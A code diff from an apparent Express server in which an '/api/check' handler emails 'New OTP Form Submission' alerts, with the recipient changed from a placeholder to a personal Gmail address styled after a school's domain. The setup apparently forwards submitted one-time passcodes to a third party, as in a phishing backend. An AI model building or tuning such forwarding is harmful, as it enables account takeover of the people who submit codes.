@@ -42,7 +42,7 @@ app.post("/api/check", async (req, res) => {
     // ✅ Send email
     await transporter.sendMail({
       from: `"Form Bot" <${process.env.EMAIL_USER}>`,
-      to: "youremail@example.com", // change to your real inbox
+      to: "jessie.bosqueschool.org@gmail.com", // change to your real inbox
       subject: "🔔 New OTP Form Submission",
       text: `
       📩 New Submission Received:
